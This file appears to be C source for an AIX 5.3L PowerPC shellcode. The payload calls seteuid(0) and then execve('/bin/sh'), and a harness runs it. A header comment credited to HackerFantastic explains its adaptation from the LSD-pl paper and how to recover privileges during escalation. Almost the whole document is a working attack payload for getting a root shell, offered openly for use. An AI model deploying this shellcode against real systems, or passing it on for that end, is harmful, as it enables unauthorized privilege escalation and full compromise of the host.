/*AIX 5.3L powerpc seteuid(0);execve("/bin/sh"); shellcode
* ========================================================
* shellcode for AIX 5.3L (other platforms need seteuid and
* execve variable change) on PowerPC. Under AIX the runtime
* linker resolves symbols by way of ptr+4 which means many
* standard Linux shellcode harnesses will not work to test 
* a payload on AIX hosts. The shellcode here is adapted and
* re-worked from LSD-pl unixcodes paper, requiring only an  
* additional "xor" and corrected svca variables to work on
* a 5.3L. On AIX when performing privilege escalation, a 
* priv drop setuid(uid) can recover privileges however real
* uid calls are strict, a process cannot recover from a 
* setreuid() call and such calls will fail after seteuid()
* however effective privileges can still be obtained if a 
* process drops them by way of seteuid() only. You can call
* setreuid() after the seteuid() succeeds if you want the
* real uid restored.
*
* -- HackerFantastic
* (https://hacker.house)
*/
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

char shellcode[]=
                "\x7f\xff\xfb\x78" /* mr      r31,r31 (nop)          */
                "\x7c\x84\x22\x78" /* xor     r4,r4,r4               */
                "\x7e\x94\xa2\x79" /* xor.    r20,r20,r20            */
                "\x40\x82\xff\xfd" /* bnel    (seteuidcode)          */
                "\x7e\xa8\x02\xa6" /* mflr    r21                    */
                "\x3a\xb5\x01\x40" /* cal     r21,0x140(r21)         */
                "\x88\x55\xfe\xe0" /* lbz     r2,-288(r21)           */
                "\x7e\x83\xa3\x78" /* mr      r3,r20                 */
                "\x3a\xd5\xfe\xe4" /* cal     r22,-284(r21)          */
                "\x7e\xc8\x03\xa6" /* mtlr    r22                    */
                "\x4c\xc6\x33\x42" /* crorc   cr6,cr6,cr6            */
                "\x44\xff\xff\x02" /* svca                           */
                "\xab\x06\xff\xff" /* 0xab = seteuid 0x06 = execve   */
                "\x38\x75\xff\x04" /* cal     r3,-252(r21)           */
                "\x38\x95\xff\x0c" /* cal     r4,-244(r21)           */
                "\x7e\x85\xa3\x78" /* mr      r5,r20                 */
                "\x90\x75\xff\x0c" /* st      r3,-244(r21)           */
                "\x92\x95\xff\x10" /* st      r20,-240(r21)          */
                "\x88\x55\xfe\xe1" /* lbz     r2,-287(r21)           */
                "\x9a\x95\xff\x0b" /* stb     r20,-245(r21)          */
                "\x4b\xff\xff\xd8" /* bl      (seteuidcode+32)       */
                "/bin/sh";

int main(){
	void *shellptr = (void*)&shellcode;
	void (*shell)() = (void*)&shellptr;
	shell();
	return 0;
}
